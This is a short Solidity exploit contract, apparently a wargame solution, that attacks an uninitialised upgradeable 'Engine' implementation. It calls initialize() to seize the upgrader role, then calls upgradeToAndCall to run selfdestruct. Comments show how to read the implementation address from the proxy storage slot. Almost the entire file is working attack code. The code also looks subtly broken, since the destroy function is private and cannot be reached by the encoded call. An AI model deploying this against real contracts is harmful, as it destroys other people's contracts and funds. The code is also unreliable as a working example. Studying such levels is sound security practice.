// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IEngine {
    function upgrader() external view returns (address);

    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;
}

contract Hack {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("selfDestruct()")
        );
    }

    function selfDestruct() private {
        selfdestruct(payable(msg.sender));
    }
}

// Get implementation(engine) address
// await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// 0x0000000000000000000000003988536e6baadc4cc132a14027c3febf76acf9a5
// therefore, Engine is at 0x3988536e6baadc4cc132a14027c3febf76acf9a5
